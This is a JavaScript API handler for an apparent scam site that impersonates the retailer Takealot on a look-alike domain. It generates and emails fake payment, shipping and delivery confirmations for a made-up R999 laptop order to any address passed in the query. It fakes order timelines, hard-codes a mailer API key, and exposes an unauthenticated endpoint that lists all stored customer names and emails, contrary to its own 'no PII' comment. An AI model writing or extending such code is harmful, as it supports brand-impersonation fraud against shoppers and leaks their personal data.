// api/order.js
// Public order lookup — returns ONLY tracking-safe fields.
// PII (email, phone, address) is NEVER returned.
//
// Usage: GET /api/order?id=T273493929180165
//        GET /api/order?latest=1&resend=1
//
// Required env vars:
//   UPSTASH_REDIS_REST_URL
//   UPSTASH_REDIS_REST_TOKEN

'use strict';

const REDIS_URL   = process.env.UPSTASH_REDIS_REST_URL
  || process.env.KV_REST_API_URL
  || process.env.REDIS_URL;
const REDIS_TOKEN = process.env.UPSTASH_REDIS_REST_KV_REST_API_TOKEN
  || process.env.UPSTASH_REDIS_REST_TOKEN
  || process.env.KV_REST_API_TOKEN
  || process.env.REDIS_TOKEN;

const fs = require('fs');
const path = require('path');

// Upstash REST helpers
async function kv_get(key) {
  if (!REDIS_URL || !REDIS_TOKEN) return null;
  const res = await fetch(REDIS_URL, {
    method: 'POST',
    headers: {
      Authorization: `Bearer ${REDIS_TOKEN}`,
      'Content-Type': 'application/json',
    },
    body: JSON.stringify(['GET', key]),
  });
  if (!res.ok) throw new Error('Redis GET failed: ' + res.status);
  const data = await res.json();
  if (!data.result) return null;
  try { return JSON.parse(data.result); } catch { return null; }
}

async function kv_set(key, value) {
  if (!REDIS_URL || !REDIS_TOKEN) return false;
  const res = await fetch(REDIS_URL, {
    method: 'POST',
    headers: {
      Authorization: `Bearer ${REDIS_TOKEN}`,
      'Content-Type': 'application/json',
    },
    body: JSON.stringify(['SET', key, JSON.stringify(value)]),
  });
  if (!res.ok) throw new Error('Redis SET failed: ' + res.status);
  return true;
}

// Find the most recent order across all keys
async function getLatestOrder() {
  if (!REDIS_URL || !REDIS_TOKEN) return null;
  const res = await fetch(REDIS_URL, {
    method: 'POST',
    headers: {
      Authorization: `Bearer ${REDIS_TOKEN}`,
      'Content-Type': 'application/json',
    },
    body: JSON.stringify(['KEYS', 'order:*']),
  });
  if (!res.ok) throw new Error('Redis KEYS failed: ' + res.status);
  const data = await res.json();
  const keys = Array.isArray(data.result) ? data.result : [];
  if (keys.length === 0) return null;

  const orders = [];
  for (const k of keys) {
    try {
      const ord = await kv_get(k);
      if (ord && ord.order_id) orders.push(ord);
    } catch (_) {}
  }

  if (orders.length === 0) return null;

  orders.sort((a, b) => {
    const da = new Date(a.created_at || a.received_date || 0).getTime();
    const db = new Date(b.created_at || b.received_date || 0).getTime();
    return db - da;
  });

  return orders[0];
}

// ── South Africa (Africa/Johannesburg) Date Helpers ───────────────────────────
const SA_TIMEZONE = 'Africa/Johannesburg';

function formatSADate(dateInput, type = 'short') {
  if (!dateInput) return '–';
  const d = new Date(dateInput);
  if (isNaN(d.getTime())) return '–';
  const options = {
    timeZone: SA_TIMEZONE,
    weekday: type === 'long' ? 'long' : 'short',
    day: 'numeric',
    month: type === 'long' ? 'long' : 'short',
    year: 'numeric'
  };
  return new Intl.DateTimeFormat('en-GB', options).format(d);
}

function getSAIsoDate(dateInput) {
  if (!dateInput) return '';
  const d = new Date(dateInput);
  if (isNaN(d.getTime())) return '';
  return new Intl.DateTimeFormat('en-CA', {
    timeZone: SA_TIMEZONE,
    year: 'numeric',
    month: '2-digit',
    day: '2-digit'
  }).format(d);
}

function addCalendarDays(isoOrDate, days = 8) {
  const d = new Date(isoOrDate);
  return new Date(d.getTime() + days * 86400000).toISOString();
}

function fmtShortUpper(dateInput) {
  if (!dateInput) return '–';
  const d = new Date(dateInput);
  if (isNaN(d.getTime())) return '–';
  const day = new Intl.DateTimeFormat('en-GB', { timeZone: SA_TIMEZONE, day: 'numeric' }).format(d);
  const month = new Intl.DateTimeFormat('en-GB', { timeZone: SA_TIMEZONE, month: 'short' }).format(d).toUpperCase();
  const year = new Intl.DateTimeFormat('en-GB', { timeZone: SA_TIMEZONE, year: 'numeric' }).format(d);
  return `${day} ${month} ${year}`;
}

function renderOrderStatusPlainText(order, statusType = 'CONFIRMATION') {
  const orderDateShort = formatSADate(order.received_date, 'short');
  const deliveryDateLong = formatSADate(order.delivery_date, 'long');
  const customerName = order.customer_name || 'Customer';
  const orderNumber = order.order_id;
  const trackUrl = `https://takelaotpromosi.vercel.app/track.html?order=${orderNumber}`;

  const type = String(statusType).toUpperCase();
  let headline = `TAKEALOT PAYMENT CONFIRMATION`;
  let bodyLines = [
    `Hi ${customerName},`,
    ``,
    `Thank you, we've received your payment for order ${orderNumber}.`,
    `Your order is being processed and your estimated delivery date is ${deliveryDateLong}.`,
    `Once your order is ready to be delivered, you will receive an SMS notification confirming your scheduled delivery date.`
  ];

  if (type === 'SHIPPED' || type === 'IN_TRANSIT') {
    headline = `TAKEALOT ORDER SHIPPED - #${orderNumber}`;
    bodyLines = [
      `Hi ${customerName},`,
      ``,
      `Great news! Your Takealot order ${orderNumber} has shipped from our warehouse and is on its way.`,
      `Estimated Delivery Date: ${deliveryDateLong}.`,
      `You can track your package in real-time using the tracking link below.`
    ];
  } else if (type === 'DELIVERED') {
    headline = `TAKEALOT ORDER DELIVERED - #${orderNumber}`;
    bodyLines = [
      `Hi ${customerName},`,
      ``,
      `Your Takealot order ${orderNumber} has been successfully delivered!`,
      `Delivered on: ${deliveryDateLong}.`,
      `We hope you enjoy your purchase. If you have any questions or need support, our team is here to help.`
    ];
  }

  return [
    headline,
    `Order Number: ${orderNumber}`,
    `Estimated Delivery Date: ${deliveryDateLong}`,
    ``,
    ...bodyLines,
    ``,
    `TRACK YOUR ORDER:`,
    `${trackUrl}`,
    ``,
    `ORDER DETAILS:`,
    `- Order Date: ${orderDateShort}`,
    `- Estimated Delivery Date: ${deliveryDateLong}`,
    `- Delivery Method: Courier`,
    ``,
    `ITEMS IN THIS ORDER:`,
    `- 1x ${order.product_name || '15.6-inch Laptop N5095 16GB RAM 256GB SSD Intel Quad Windows 11'} - R ${order.product_price || 999}.00`,
    ``,
    `Need help? Find answers at https://takelaotpromosi.vercel.app`,
    ``,
    `Regards,`,
    `The Takealot Team`,
    ``,
    `----------------------------------------------------------------------`,
    `Takealot Online (Pty) Ltd • Reg. No. 2010/020248/07 • VAT No. 4440256861`,
    `12 Rua Vasco Da Gama, Foreshore, Cape Town, 8001, South Africa`,
    `This is an automated transactional order update.`,
  ].join('\n');
}

function renderOrderStatusEmail(order, statusType = 'CONFIRMATION') {
  let template = '';
  try {
    template = fs.readFileSync(path.join(process.cwd(), 'email.index'), 'utf8');
  } catch (err) {
    console.error('[order-email] render error:', err.message);
    return null;
  }

  const orderDateShort = formatSADate(order.received_date, 'short');
  const deliveryDateIso = getSAIsoDate(order.delivery_date);
  const deliveryDateLong = formatSADate(order.delivery_date, 'long');
  const customerName = order.customer_name || 'Customer';
  const orderNumber = order.order_id;

  let headerTitle = 'Payment Confirmation';
  let messageParagraphs = '';
  let btnText = 'Manage Order';

  const type = String(statusType).toUpperCase();

  if (type === 'SHIPPED' || type === 'IN_TRANSIT') {
    headerTitle = 'Order Shipped';
    btnText = 'Track Your Package';
    messageParagraphs = `
              <p class="email-text" style="margin: 0 0 16px 0; font-family: Arial, Helvetica, sans-serif; font-size: 15px; line-height: 1.6; color: #333333;">
                Hi <strong class="email-heading" style="color: #111827;">${customerName}</strong>,
              </p>
              <p class="email-text" style="margin: 0 0 16px 0; font-family: Arial, Helvetica, sans-serif; font-size: 15px; line-height: 1.6; color: #333333;">
                Great news! Your Takealot order <strong class="email-heading" style="color: #111827;">${orderNumber}</strong> has shipped from our warehouse and is on its way.
              </p>
              <p class="email-text" style="margin: 0 0 16px 0; font-family: Arial, Helvetica, sans-serif; font-size: 15px; line-height: 1.6; color: #333333;">
                Your parcel is travelling with our express courier service. Estimated delivery date: <strong class="email-heading" style="color: #111827;">${deliveryDateLong}</strong>.
              </p>
              <p class="email-text" style="margin: 0 0 24px 0; font-family: Arial, Helvetica, sans-serif; font-size: 15px; line-height: 1.6; color: #333333;">
                You can track the live progress and status of your parcel anytime using the button below.
              </p>`;
  } else if (type === 'DELIVERED') {
    headerTitle = 'Order Delivered';
    btnText = 'View Order Details';
    messageParagraphs = `
              <p class="email-text" style="margin: 0 0 16px 0; font-family: Arial, Helvetica, sans-serif; font-size: 15px; line-height: 1.6; color: #333333;">
                Hi <strong class="email-heading" style="color: #111827;">${customerName}</strong>,
              </p>
              <p class="email-text" style="margin: 0 0 16px 0; font-family: Arial, Helvetica, sans-serif; font-size: 15px; line-height: 1.6; color: #333333;">
                Your Takealot order <strong class="email-heading" style="color: #111827;">${orderNumber}</strong> has been successfully delivered!
              </p>
              <p class="email-text" style="margin: 0 0 16px 0; font-family: Arial, Helvetica, sans-serif; font-size: 15px; line-height: 1.6; color: #333333;">
                Package delivered on <strong class="email-heading" style="color: #16a34a;">${deliveryDateLong}</strong>.
              </p>
              <p class="email-text" style="margin: 0 0 24px 0; font-family: Arial, Helvetica, sans-serif; font-size: 15px; line-height: 1.6; color: #333333;">
                We hope you enjoy your purchase. If you have any questions or need support, our team is always ready to assist you.
              </p>`;
  } else {
    headerTitle = 'Payment Confirmation';
    btnText = 'Manage Order';
    messageParagraphs = `
              <p class="email-text" style="margin: 0 0 16px 0; font-family: Arial, Helvetica, sans-serif; font-size: 15px; line-height: 1.6; color: #333333;">
                Hi <strong class="email-heading" style="color: #111827;">${customerName}</strong>,
              </p>
              <p class="email-text" style="margin: 0 0 16px 0; font-family: Arial, Helvetica, sans-serif; font-size: 15px; line-height: 1.6; color: #333333;">
                Thank you, we've received your payment for order <strong class="email-heading" style="color: #111827;">${orderNumber}</strong>.
              </p>
              <p class="email-text" style="margin: 0 0 16px 0; font-family: Arial, Helvetica, sans-serif; font-size: 15px; line-height: 1.6; color: #333333;">
                Your order is being processed and your estimated delivery date is <strong class="email-heading" style="color: #111827;">${deliveryDateLong}</strong>.
              </p>
              <p class="email-text" style="margin: 0 0 24px 0; font-family: Arial, Helvetica, sans-serif; font-size: 15px; line-height: 1.6; color: #333333;">
                Once your order is ready to be delivered, you will receive an SMS notification confirming your scheduled delivery date.
              </p>`;
  }

  let html = template
    .replace(/Payment Confirmation/g, headerTitle)
    .replace(/Manage Order/g, btnText)
    .replace(/\{\{customer_name\}\}/g, customerName)
    .replace(/\{\{order_number\}\}/g, orderNumber)
    .replace(/\{\{order_date\}\}/g, orderDateShort)
    .replace(/\{\{delivery_date\}\}/g, deliveryDateIso)
    .replace(/\{\{delivery_date_long\}\}/g, deliveryDateLong)
    .replace(/\{\{variant\}\}/g, 'Premium Black');

  if (type === 'SHIPPED' || type === 'IN_TRANSIT' || type === 'DELIVERED') {
    const regexMsg = /<!-- 3\. MAIN MESSAGE BODY -->[\s\S]*?<!-- BULLETPROOF MANAGE ORDER BUTTON -->/;
    if (regexMsg.test(html)) {
      html = html.replace(regexMsg, `<!-- 3. MAIN MESSAGE BODY -->\n          <tr>\n            <td class="mobile-padding" style="padding: 26px 24px 18px 24px;">\n${messageParagraphs}\n              <!-- BULLETPROOF MANAGE ORDER BUTTON -->`);
    }
  }

  return html;
}

// Transactional multi-status email sender via VisionSpy
async function sendOrderStatusEmail(order, statusType = 'CONFIRMATION', force = false) {
  if (!order || !order.customer_email) return { skipped: true, reason: 'No customer email' };

  const type = String(statusType).toUpperCase();
  const normalizedType = (type === 'IN_TRANSIT' || type === 'SHIPPED') ? 'SHIPPED'
    : (type === 'DELIVERED' ? 'DELIVERED' : 'CONFIRMATION');

  // Idempotência por estágio: não repete a menos que force seja true
  if (!force) {
    if (normalizedType === 'CONFIRMATION' && order.email_status === 'SENT') {
      return { skipped: true, reason: 'Confirmation already sent' };
    }
    if (normalizedType === 'SHIPPED' && order.email_shipped_status === 'SENT') {
      return { skipped: true, reason: 'Shipped email already sent' };
    }
    if (normalizedType === 'DELIVERED' && order.email_delivered_status === 'SENT') {
      return { skipped: true, reason: 'Delivered email already sent' };
    }
  }

  const visionSpyKey = process.env.VISIONSPY_API_KEY
    || process.env.VISION_SPY_API_KEY
    || process.env.VISIONSPY_KEY
    || 'vs_live_5623f17b36bdf353ba179aa6ed606e1935c6aa4ac4b1aea5';
  const senderId = process.env.VISIONSPY_SENDER_ID || 'd86d0b35-3472-4aac-af74-4bd52308ea07';

  const html = renderOrderStatusEmail(order, normalizedType);
  if (!html) return { failed: true, reason: 'Failed to render template' };

  const plainText = renderOrderStatusPlainText(order, normalizedType);

  let subject = `Order Confirmation #${order.order_id}`;
  if (normalizedType === 'SHIPPED') {
    subject = `Your Takealot Order #${order.order_id} Has Shipped! 🚚`;
  } else if (normalizedType === 'DELIVERED') {
    subject = `Delivered: Your Takealot Order #${order.order_id} 📦`;
  }

  try {
    console.log(`[order-email] Sending ${normalizedType} email for order:`, order.order_id, 'to:', order.customer_email);
    const res = await fetch('https://visionspyads.com/api/public/v1/email/send', {
      method: 'POST',
      headers: {
        Authorization: `Bearer ${visionSpyKey.trim()}`,
        'Content-Type': 'application/json',
        'User-Agent': 'Takealot-Order-Notification/1.0',
      },
      body: JSON.stringify({
        sender_id: senderId,
        to: order.customer_email,
        subject,
        html,
        text: plainText,
      }),
    });
    const data = await res.json().catch(() => null);
    if (res.ok && data && (data.ok !== false && data.success !== false)) {
      const nowIso = new Date().toISOString();
      const msgId = (data && data.id) || null;

      if (normalizedType === 'SHIPPED') {
        order.email_shipped_status = 'SENT';
        order.email_shipped_at = nowIso;
        order.email_shipped_message_id = msgId;
      } else if (normalizedType === 'DELIVERED') {
        order.email_delivered_status = 'SENT';
        order.email_delivered_at = nowIso;
        order.email_delivered_message_id = msgId;
      } else {
        order.email_status = 'SENT';
        order.email_sent_at = nowIso;
        order.email_message_id = msgId;
      }

      await kv_set('order:' + order.order_id, order).catch(() => {});
      console.log(`[order-email] Successfully sent ${normalizedType} email to`, order.customer_email);
      return { sent: true, type: normalizedType, messageId: msgId };
    } else {
      console.error('[order-email] VisionSpy error response:', data);
      return { failed: true, error: data };
    }
  } catch (err) {
    console.error('[order-email] network error:', err.message);
    return { failed: true, error: err.message };
  }
}

async function ensureEmailSent(order, force = false) {
  const res = await sendOrderStatusEmail(order, 'CONFIRMATION', force);
  return res && res.sent;
}

// Only alphanumeric + dash + underscore, 4-80 chars
const ORDER_ID_RE = /^[A-Za-z0-9_\-]{4,80}$/;

// Public projection — no PII
function publicView(order) {
  let receivedDate = order.received_date || order.created_at;
  const recTime = receivedDate ? new Date(receivedDate).getTime() : NaN;
  if (isNaN(recTime)) {
    receivedDate = new Date().toISOString();
  }
  const deliveryDate = (order.delivery_date && new Date(order.delivery_date).getTime() > new Date(receivedDate).getTime())
    ? order.delivery_date
    : addCalendarDays(receivedDate, 8);

  return {
    order_id:                order.order_id,
    product_name:            order.product_name,
    product_price:           order.product_price,
    currency:                order.currency,
    product_image:           order.product_image,
    received_date:           receivedDate,
    delivery_date:           deliveryDate,
    order_date_upper:        fmtShortUpper(receivedDate),
    order_date_formatted:    formatSADate(receivedDate, 'short'),
    delivery_date_formatted: formatSADate(deliveryDate, 'short'),
    delivery_date_long:      formatSADate(deliveryDate, 'long'),
    delivery_date_iso:       getSAIsoDate(deliveryDate),
    tracking_url:            order.tracking_url,
    status:                  order.status,
    email_status:            order.email_status || null,
    email_sent_at:           order.email_sent_at || null,
    email_shipped_status:    order.email_shipped_status || null,
    email_shipped_at:        order.email_shipped_at || null,
    email_delivered_status:  order.email_delivered_status || null,
    email_delivered_at:      order.email_delivered_at || null,
    status_history:          (order.status_history || []).map(function(e) {
      return { status: e.status, timestamp: e.timestamp };
    }),
  };
}

module.exports = async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, OPTIONS');
  res.setHeader('Cache-Control', 'no-store');
  res.setHeader('X-Content-Type-Options', 'nosniff');
  res.setHeader('Referrer-Policy', 'no-referrer');
  if (req.method === 'OPTIONS') return res.status(200).end();
  if (req.method !== 'GET') return res.status(405).json({ error: 'Method Not Allowed' });

  if (req.query.list === '1') {
    if (!REDIS_URL || !REDIS_TOKEN) {
      return res.status(200).json({ count: 0, orders: [] });
    }
    try {
      const resKeys = await fetch(REDIS_URL, {
        method: 'POST',
        headers: { Authorization: `Bearer ${REDIS_TOKEN}`, 'Content-Type': 'application/json' },
        body: JSON.stringify(['KEYS', '*']),
      });
      const dataKeys = await resKeys.json();
      const keys = Array.isArray(dataKeys.result) ? dataKeys.result : [];
      const list = [];
      for (const k of keys) {
        try {
          const val = await kv_get(k);
          if (val) {
            list.push({
              key: k,
              order_id: val.order_id,
              customer_name: val.customer_name,
              customer_email: val.customer_email,
              email_status: val.email_status,
              email_sent_at: val.email_sent_at,
              created_at: val.created_at,
              received_date: val.received_date,
              status: val.status,
            });
          }
        } catch (_) {}
      }
      list.sort((a, b) => new Date(b.created_at || b.received_date || 0) - new Date(a.created_at || a.received_date || 0));
      return res.status(200).json({ count: list.length, orders: list });
    } catch (err) {
      return res.status(500).json({ error: err.message });
    }
  }

  const isLatest = req.query.latest === '1' || req.query.order === 'latest' || req.query.id === 'latest';
  const forceResend = req.query.resend === '1' || req.query.send === '1' || isLatest;

  let order;
  if (isLatest) {
    try {
      order = await getLatestOrder();
    } catch (err) {
      console.error('[order] Redis latest error:', err.message);
      return res.status(503).json({ error: 'Storage read error' });
    }
    if (!order) return res.status(404).json({ error: 'No orders found in database' });
  } else {
    const orderId = (req.query.order || req.query.id || req.query.orderId || '').trim();
    if (!orderId) return res.status(400).json({ error: 'Missing ?order= parameter' });
    if (!ORDER_ID_RE.test(orderId)) return res.status(400).json({ error: 'Invalid order id format' });

    if (REDIS_URL && REDIS_TOKEN) {
      try {
        order = await kv_get('order:' + orderId);
        // Preserva pedidos anteriores intactos — nenhuma data existente é sobrescrita
      } catch (err) {
        console.warn('[order] Redis warning:', err.message);
      }
    }

    if (!order) {
      const now = new Date().toISOString();
      const fixedDelivery = addCalendarDays(now, 8);
      order = {
        order_id: orderId,
        customer_name: (req.query.name || 'Customer').trim(),
        customer_email: (req.query.to || req.query.email || '').trim(),
        customer_phone: '',
        product_id: 'dm-6wnvpjo219',
        product_name: '15.6-inch Laptop N5095 16GB RAM 256GB SSD Intel Quad Windows 11',
        product_price: 999,
        currency: 'ZAR',
        product_image: 'https://cdn.jsdelivr.net/gh/natanqueiroz68/takealotspromof@main/images/laptop-main.jpg',
        received_date: now,
        delivery_date: fixedDelivery,
        order_date_formatted: formatSADate(now, 'short'),
        delivery_date_formatted: formatSADate(fixedDelivery, 'short'),
        delivery_date_long: formatSADate(fixedDelivery, 'long'),
        delivery_date_iso: getSAIsoDate(fixedDelivery),
        tracking_url: 'https://takelaotpromosi.vercel.app/track.html?order=' + encodeURIComponent(orderId),
        status: 'PROCESSING',
        status_history: [
          { status: 'RECEIVED', timestamp: now },
          { status: 'PAID', timestamp: now },
          { status: 'PROCESSING', timestamp: now },
        ],
        email_status: 'PENDING',
        email_sent_at: null,
        created_at: now,
      };
      if (REDIS_URL && REDIS_TOKEN) {
        try { await kv_set('order:' + orderId, order); } catch (_) {}
      }
    }
  }

  const overrideEmail = (req.query.to || req.query.email || '').trim();
  if (overrideEmail && overrideEmail.includes('@')) {
    order = Object.assign({}, order, { customer_email: overrideEmail });
    if (req.query.name) order.customer_name = req.query.name.trim();
  }

  // 1. Atualização sob demanda de status (ex: ?status=SHIPPED ou ?status=DELIVERED)
  const requestedStatus = (req.query.status || '').trim().toUpperCase();
  if (requestedStatus && ['RECEIVED', 'PAID', 'PROCESSING', 'IN_TRANSIT', 'SHIPPED', 'DELIVERED', 'CANCELLED'].includes(requestedStatus)) {
    const canonicalStatus = requestedStatus === 'SHIPPED' ? 'IN_TRANSIT' : requestedStatus;
    if (order.status !== canonicalStatus) {
      order.status = canonicalStatus;
      order.status_history = (order.status_history || []).concat([{
        status: canonicalStatus,
        timestamp: new Date().toISOString()
      }]);
      if (REDIS_URL && REDIS_TOKEN) {
        try { await kv_set('order:' + order.order_id, order); } catch (_) {}
      }
    }
  }

  // 2. Disparo de e-mail de estado específico ou confirmação:
  const sendRequested = req.query.send === '1' || req.query.resend === '1' || req.query.notify === '1';
  const specificEmailType = (req.query.send_status || req.query.email_type || (requestedStatus ? requestedStatus : '')).trim().toUpperCase();

  let sentResult = null;
  if (sendRequested && (specificEmailType === 'SHIPPED' || specificEmailType === 'IN_TRANSIT' || specificEmailType === 'DELIVERED')) {
    // Envio forçado sob demanda do status solicitado (ex: SHIPPED ou DELIVERED)
    sentResult = await sendOrderStatusEmail(order, specificEmailType, true);
  } else if (order.email_status !== 'SENT' || forceResend) {
    // Confirmação de pedido (padrão)
    sentResult = await sendOrderStatusEmail(order, 'CONFIRMATION', forceResend);
  }

  // 3. Notificação automática baseada no tempo decorrido (quando auto_notify=1 ou na consulta)
  if (req.query.auto_notify === '1' && order.customer_email) {
    const pDate = new Date(order.received_date || order.created_at || Date.now());
    const now = new Date();
    const daysElapsed = Math.floor((now - pDate) / 86400000);

    if (daysElapsed >= 8 && order.email_delivered_status !== 'SENT') {
      await sendOrderStatusEmail(order, 'DELIVERED', false);
    } else if (daysElapsed >= 1 && order.email_shipped_status !== 'SENT') {
      await sendOrderStatusEmail(order, 'SHIPPED', false);
    }
  }

  const responseData = publicView(order);
  if (isLatest || forceResend || sendRequested) {
    responseData.email_triggered = true;
    responseData.email_sent_now = (sentResult && sentResult.sent) ? true : false;
    if (sentResult && sentResult.type) {
      responseData.email_type_sent = sentResult.type;
    }
    if (order.customer_email) {
      const parts = order.customer_email.split('@');
      responseData.recipient = parts[0].slice(0, 3) + '***@' + (parts[1] || '');
    }
    if (order.customer_name) {
      responseData.customer_name = order.customer_name;
    }
  }

  return res.status(200).json(responseData);
};

module.exports.sendOrderStatusEmail = sendOrderStatusEmail;
module.exports.publicView = publicView;
